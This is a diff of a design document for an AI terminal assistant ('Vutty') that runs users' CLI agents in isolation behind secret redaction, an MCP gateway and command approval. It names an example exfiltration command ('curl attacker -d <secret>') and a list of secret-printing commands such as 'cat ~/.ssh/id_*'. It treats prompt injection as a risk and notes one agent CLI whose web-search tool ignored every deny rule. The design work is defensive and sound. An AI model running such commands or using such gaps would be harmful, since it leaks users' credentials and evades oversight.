@@ -1,4 +1,4 @@
-# VuTerm — AI terminal assistant design document
+# Vutty — AI terminal assistant design document
 
 > Status: **Implemented** on branch `feature/add-assistant-ai` (see [section 13](#13-implementation-status)) · Updated: 2026-10-29 · Author: Vũ Nguyễn Vũ
 
@@ -22,11 +22,11 @@
 
 ## 1. Overview
 
-While a host is open, the user can ask an assistant for help with what is on the terminal screen: explain an error, suggest the next command, diagnose a failing service. The assistant is **not** an API client with its own key. VuTerm starts the AI command-line tool the user already has and is signed in to (Claude Code, Codex CLI, Gemini CLI, and others) as a local subprocess, so the user's existing subscription is used and VuTerm never sees a token.
+While a host is open, the user can ask an assistant for help with what is on the terminal screen: explain an error, suggest the next command, diagnose a failing service. The assistant is **not** an API client with its own key. Vutty starts the AI command-line tool the user already has and is signed in to (Claude Code, Codex CLI, Gemini CLI, and others) as a local subprocess, so the user's existing subscription is used and Vutty never sees a token.
 
 **Goals**
 
-- Ask about the active terminal pane without leaving VuTerm.
+- Ask about the active terminal pane without leaving Vutty.
 - Use any supported CLI agent through one interface; the user picks which one.
 - Guarantee, in code and not by prompt, that secrets are never sent to the agent and never shown in the assistant UI. Everything sensitive appears as `*******`.
 - The assistant proposes commands; the user approves them. Nothing runs by itself.
@@ -43,7 +43,7 @@ While a host is open, the user can ask an assistant for help with what is on the
 | Question | Answer |
 |---|---|
 | Can a CLI agent be driven from Go? | Yes. `claude -p --output-format stream-json`, `codex exec`, and `gemini -p` are non-interactive and stream output. `internal/localtty` already spawns local processes. |
-| Does it use the subscription? | Yes. Each CLI authenticates itself; VuTerm only spawns it. VuTerm must never read or copy the CLI's OAuth token. |
+| Does it use the subscription? | Yes. Each CLI authenticates itself; Vutty only spawns it. Vutty must never read or copy the CLI's OAuth token. |
 | Can the screen be read? | Yes. xterm.js keeps a text buffer; `SessionService` already sees all output. |
 | Can commands be sent? | Yes. `SessionService.Write(sid, data)` is the same path keystrokes use. |
 | Is Antigravity supported? | Unverified: no stable headless CLI was found. It is supported only through the generic "custom command" adapter ([5.3](#53-custom-command-adapter)). |
@@ -100,7 +100,7 @@ The `Agent` port is `Ask(ctx, Request) (Reply, error)` where `Request` holds onl
 
 **Ingress (agent → UI).** The reply, including proposed commands and explanations, goes through the same guard before it is shown or stored. If the agent guesses or echoes a secret, the UI still shows `*******`.
 
-**Command guard (agent → terminal).** A proposed command that contains the mask or a redaction placeholder cannot be run from the UI: the user must type it. VuTerm deliberately does **not** substitute real secrets back into commands, because that would let an injected agent exfiltrate them (for example `curl attacker -d <secret>`). Commands that are likely to print secrets (`cat .env`, `env`, `printenv`, `history`, `cat ~/.ssh/id_*`, `docker inspect`, and similar) get a warning; their output is redacted again when it returns to the agent.
+**Command guard (agent → terminal).** A proposed command that contains the mask or a redaction placeholder cannot be run from the UI: the user must type it. Vutty deliberately does **not** substitute real secrets back into commands, because that would let an injected agent exfiltrate them (for example `curl attacker -d <secret>`). Commands that are likely to print secrets (`cat .env`, `env`, `printenv`, `history`, `cat ~/.ssh/id_*`, `docker inspect`, and similar) get a warning; their output is redacted again when it returns to the agent.
 
 ### 4.4 Detection sources
 
@@ -128,10 +128,10 @@ The guard is pointless if the CLI can read the data another way, so the agent is
 
 - working directory = a fresh empty temporary directory, removed after the call;
 - all file, shell, and web tools disabled (Claude: `--allowedTools ""` plus a deny list; Codex: read-only sandbox, no network tools; Gemini: no tools);
-- a scrubbed environment: no `SSH_AUTH_SOCK`, no `VUTERM_*`, and no variable whose name matches the secret name pattern; only what the CLI needs to find its own login (`HOME`, `PATH`, locale);
+- a scrubbed environment: no `SSH_AUTH_SOCK`, no `VUTTY_*`, and no variable whose name matches the secret name pattern; only what the CLI needs to find its own login (`HOME`, `PATH`, locale);
 - a timeout and an output size cap.
 
-The only data channel into the agent is the redacted prompt, **plus the VuTerm MCP gateway when the user has added MCP servers** ([5.7](#57-mcp-servers-and-the-gateway)). The agent is never given an MCP server's own address or credentials; it can reach MCP tools only through the gateway, where the guards apply.
+The only data channel into the agent is the redacted prompt, **plus the Vutty MCP gateway when the user has added MCP servers** ([5.7](#57-mcp-servers-and-the-gateway)). The agent is never given an MCP server's own address or credentials; it can reach MCP tools only through the gateway, where the guards apply.
 
 ### 4.6 Limits
 
@@ -173,11 +173,11 @@ Providers are discovered at runtime, never assumed. `Detect()` runs on app start
 | 3 | Check the adapter's required flags are accepted (for example `--help` output contains the tool-disabling flag). | `supported` / `unsupported version` |
 | 4 | Sign-in state, where the CLI offers a cheap offline check (a status command or the presence of its credential file, **checked for existence only, never read**). | `signed in` / `not signed in` / `unknown` |
 
-Each provider has one status: `ready`, `needs sign-in`, `unsupported version`, `not installed`, or `disabled`. Detection never sends a prompt, so it costs no subscription usage. VuTerm does not sign the user in; the "needs sign-in" state shows the command to run in the terminal (for example `claude` or `codex login`).
+Each provider has one status: `ready`, `needs sign-in`, `unsupported version`, `not installed`, or `disabled`. Detection never sends a prompt, so it costs no subscription usage. Vutty does not sign the user in; the "needs sign-in" state shows the command to run in the terminal (for example `claude` or `codex login`).
 
 ### 5.4 Model discovery
 
-The model list is **loaded from the provider itself**, never from a list hard-coded in VuTerm. `Models()` asks the provider's own tooling which models the signed-in account can use, so the list follows the user's subscription and new models appear without a VuTerm release. VuTerm adds no model names of its own.
+The model list is **loaded from the provider itself**, never from a list hard-coded in Vutty. `Models()` asks the provider's own tooling which models the signed-in account can use, so the list follows the user's subscription and new models appear without a Vutty release. Vutty adds no model names of its own.
 
 How each provider is asked (verified against the installed CLIs on 2026-10-29: Claude Code 2.1.312, Codex 0.153.4, Gemini 0.44.1):
 
@@ -189,7 +189,7 @@ How each provider is asked (verified against the installed CLIs on 2026-10-29: C
 
 The model is **chosen from the list, never typed**. `Default (CLI decides)` is always first and passes no model flag. When a provider cannot list its models the picker does **not** invent a list: it offers only `Default`, and the panel says the provider uses its default model. A model id that the provider did not list is refused when it is saved.
 
-The list is cached in memory with a timestamp and refreshed by the Refresh button, by Settings opening, and when the cache is older than 24 hours. A failed refresh keeps the previous list and shows "Could not refresh models". Reading a catalogue never sends a prompt and costs no subscription usage. VuTerm reads only the model catalogue, never the credential files next to it (`auth.json` and similar).
+The list is cached in memory with a timestamp and refreshed by the Refresh button, by Settings opening, and when the cache is older than 24 hours. A failed refresh keeps the previous list and shows "Could not refresh models". Reading a catalogue never sends a prompt and costs no subscription usage. Vutty reads only the model catalogue, never the credential files next to it (`auth.json` and similar).
 
 If the CLI rejects a chosen model, the error is shown in the panel ("Model not available for this account") and the request is not retried with another model automatically.
 
@@ -211,10 +211,10 @@ If the reply is not valid JSON it is shown as plain text with no runnable comman
 
 The user can add MCP servers to the assistant (Settings → [8.2](#82-mcp-servers-page)): a documentation search, an issue tracker, a runbook store, and so on. MCP tools can read data and have side effects, and the agent calls them directly, so passing a server straight to the CLI would bypass every guard in [4](#4-secret-policy). Therefore:
 
-**The agent never connects to a user MCP server. It connects only to the VuTerm gateway**, a loopback MCP server inside VuTerm (random port, per-request token, same pattern as [app/bridge.go](../app/bridge.go)). The gateway forwards allowed calls to the real servers, which VuTerm itself runs and holds credentials for.
+**The agent never connects to a user MCP server. It connects only to the Vutty gateway**, a loopback MCP server inside Vutty (random port, per-request token, same pattern as [app/bridge.go](../app/bridge.go)). The gateway forwards allowed calls to the real servers, which Vutty itself runs and holds credentials for.
 
 ```
-Agent CLI ──► VuTerm gateway (loopback, token) ──► MCP server A (stdio, started by VuTerm)
+Agent CLI ──► Vutty gateway (loopback, token) ──► MCP server A (stdio, started by Vutty)
                   │  [E] redact tool arguments                    MCP server B (HTTP)
                   │  [I] redact tool results
                   └─ allow-list, approval, size and rate limits, activity log
@@ -235,9 +235,9 @@ Approval and limits:
 - The MCP servers are available only on hosts and requests where the assistant is on ([7](#7-data-model-and-settings)); a host set to `off` exposes nothing.
 - Every call (server, tool, redacted arguments, outcome) goes to the activity log.
 
-**How VuTerm talks to the user's servers**
+**How Vutty talks to the user's servers**
 
-- **stdio servers:** VuTerm starts the process itself with the command, arguments, and environment the user entered. The environment is built from the entries in the form only (no inheritance from VuTerm); secret values live in the vault, not in the database, and are never shown again after saving (`*******`). The working directory is the same empty temporary directory as for the agent.
+- **stdio servers:** Vutty starts the process itself with the command, arguments, and environment the user entered. The environment is built from the entries in the form only (no inheritance from Vutty); secret values live in the vault, not in the database, and are never shown again after saving (`*******`). The working directory is the same empty temporary directory as for the agent.
 - **HTTP servers:** URL plus optional headers, with header values stored in the vault. OAuth-based remote servers are out of scope for the first release.
 - A server that fails to start or answer is shown as `Unavailable` and its tools are removed from the gateway, never retried silently in a loop.
 
@@ -245,7 +245,7 @@ Approval and limits:
 
 **Built-in terminal tools.** The `terminal_read` and `terminal_propose_command` tools of Phase 3 are served by the same gateway, so there is one enforcement point. `terminal_propose_command` produces a command card; it never runs a command itself ([6](#6-command-execution-and-approval)).
 
-**Import.** The page can list MCP servers found in the CLIs' own configuration files, so the user does not retype them. Import is explicit and per server: VuTerm reads the file only after the user presses Import, shows what would be copied, moves any secret values into the vault, and never imports a server silently.
+**Import.** The page can list MCP servers found in the CLIs' own configuration files, so the user does not retype them. Import is explicit and per server: Vutty reads the file only after the user presses Import, shows what would be copied, moves any secret values into the vault, and never imports a server silently.
 
 ## 6. Command execution and approval
 
@@ -302,7 +302,7 @@ Settings gets an **AI providers** page that lists every provider found by detect
 
 Rules:
 
-- A provider is **off until the user switches it on**, so installing a CLI never makes VuTerm start sending screens to it.
+- A provider is **off until the user switches it on**, so installing a CLI never makes Vutty start sending screens to it.
 - The assistant panel offers only enabled, ready providers. **Switching** provider in the panel is immediate and applies from the next question; a running request is not moved to another provider.
 - Exactly one provider is the default. Disabling the default picks the next enabled one, or leaves none and the panel shows "Enable a provider in Settings".
 - Switching provider never carries chat history across: each provider is a different company receiving the data, so a new provider starts a new conversation and only the redacted current screen is sent.
@@ -388,7 +388,7 @@ Phases 1 and 2 are the commitment of this document; 3, 3b, and 4 are decided aft
 2. **Prompt injection.** Terminal output is untrusted and may contain instructions aimed at the agent. Mitigation: no agent tools, no auto-run, commands shown verbatim, real secrets never re-inserted.
 3. **CLI drift.** Flags and output formats change between versions. Adapters verify the version and fail with a clear message instead of degrading safety.
 4. **Latency.** Starting a CLI takes seconds; streaming and session resume reduce the perceived delay.
-5. **Terms of service.** Only the official CLI, signed in by the user, is started. VuTerm never extracts or reuses its credentials.
+5. **Terms of service.** Only the official CLI, signed in by the user, is started. Vutty never extracts or reuses its credentials.
 6. **MCP servers widen the attack surface.** A user-added server may have side effects, return injected instructions, or be malicious. Mitigation: the gateway is the only path, tools are opt-in, side-effecting tools ask each time, arguments are blocked when they contain secrets, results are redacted, and servers are not trusted by default. A server the user starts is still code running with the user's privileges; the page says so.
 7. **Full-screen applications** (vim, htop) produce noisy buffers. The assistant uses the normal buffer and, when the alternate screen is active, says so in the preview.
 
@@ -414,10 +414,10 @@ Everything in sections 1 to 11 is implemented except the items listed under *Not
 |---|---|
 | Claude Code 2.1.312: detection (`--version`, required flags, `claude auth status`), models from the `initialize` control response (13 models), isolation self-test, a real question | Pass |
 | Codex CLI 0.153.4: detection, models from its fetched catalogue (`visibility == "list"`), isolation self-test (`--disable shell_tool`), a real question | Pass |
-| Claude Code through the gateway: the agent called a tool of a fake MCP server through the VuTerm gateway only; a `password=...` in the tool result was masked before the agent saw it | Pass |
+| Claude Code through the gateway: the agent called a tool of a fake MCP server through the Vutty gateway only; a `password=...` in the tool result was masked before the agent saw it | Pass |
 | Gemini CLI 0.44.1 | Detected, but **not signed in with a usable method** on this computer (its settings select `gateway`), so the isolation self-test and a question could not run. The adapter is covered by fake-CLI tests only. |
 
-Run the live checks yourself with `VUTERM_LIVE=1 go test ./internal/agentx -run Live -v` (a few tiny requests).
+Run the live checks yourself with `VUTTY_LIVE=1 go test ./internal/agentx -run Live -v` (a few tiny requests).
 
 ### Differences from the design
 
@@ -425,7 +425,7 @@ Run the live checks yourself with `VUTERM_LIVE=1 go test ./internal/agentx -run 
 - **Isolation self-test on enable (new).** Turning a provider on asks it to run `hostname` and to search the web; the provider is enabled only if it uses no tool, does not know the answer and says it has no way to reach the web. It is repeated when the CLI version changes. This is what makes an adapter whose isolation cannot be checked in advance (Gemini, custom commands) safe to offer.
 - **Claude isolation** uses `--tools ""`, `--strict-mcp-config`, `--disable-slash-commands`, `--no-session-persistence` and `--restricted` (which also ignores the user's settings files and hooks). `--bare` is not used: it cannot use the subscription login.
 - **Models are read from the provider** as described in 5.4: Claude through its control protocol, Codex through its cached catalogue, Gemini cannot list. Codex's `app-server` is not used.
-- **Gemini sign-in** is decided from the selected auth type in its settings (only "Login with Google" works, because the other methods need an API key or gateway from the environment, which VuTerm does not pass on) plus the existence of its sign-in file.
+- **Gemini sign-in** is decided from the selected auth type in its settings (only "Login with Google" works, because the other methods need an API key or gateway from the environment, which Vutty does not pass on) plus the existence of its sign-in file.
 - **MCP through the gateway works for Claude Code only.** Codex and Gemini report `SupportsMCP() == false` because disabling their own MCP configuration while adding one gateway entry was not verified; they get the terminal text but no tools, as the design requires.
 - **The UI chooses the request id** of a question, so it can listen for events before the question starts (the answer can begin before `Ask` returns).
 - **Streaming** sends the whole text so far, cleaned again each time, so a secret split over two chunks is still masked; text that looks like the start of the JSON envelope is not shown.
@@ -441,7 +441,7 @@ Run the live checks yourself with `VUTERM_LIVE=1 go test ./internal/agentx -run 
 - **Locking the vault closes the Settings window** (it shows security options and the providers), whether the user locked it or the inactivity timer did.
 - **No white flash when Settings opens:** the page paints its background before any script loads, the last appearance is remembered, and the Settings web view is transparent over the window colour.
 - **Antigravity CLI (`agy`) is listed but cannot be enabled.** It works headlessly (`agy --print --output-format stream-json`, `agy models`), but it applies the user's own allow-rules (on the test machine they allow `command(echo)` and Gmail and Calendar MCP tools, and `echo` really ran). Session-only deny rules (`--settings`) stop commands, MCP and file tools (verified: `echo` was refused), but its **`search_web` tool ran under every deny rule tried** (`search_web(*)`, `web(*)`, `search(*)`, `network(*)`, `tool(*)`, `*`), which is a way for text to leave in a query. The isolation self-test now includes a web probe, so the provider fails it (`the agent used a tool to reach the web`). Verified live. The adapter is kept: it will pass once a version honours a rule for that tool.
-- **Why the Gemini CLI still says "Needs sign-in":** the Gemini CLI and Antigravity share `~/.gemini`, and Antigravity sets `security.auth.selectedType` to `gateway`, which the Gemini CLI does not support. VuTerm does not touch that file; the message now says so and points to Antigravity.
+- **Why the Gemini CLI still says "Needs sign-in":** the Gemini CLI and Antigravity share `~/.gemini`, and Antigravity sets `security.auth.selectedType` to `gateway`, which the Gemini CLI does not support. Vutty does not touch that file; the message now says so and points to Antigravity.
 - **Confirmations are in the chat and only for what changes something.** Reading the screen to answer needs no confirmation: the default policy of a host is On (Off on production). A host can be set to *Ask first*, which shows the redacted preview as a card in the chat. Pictures are confirmed in a card too. A command that only reads runs with one click; a command that can change something (or may print secrets) asks in its card, and a risky one needs the word `run`. Nothing opens as a popup.
 - **Terminal input methods:** text being composed (Vietnamese Telex, pinyin, kana) is shown at the cursor with the theme's colours inverted until it is committed.
 
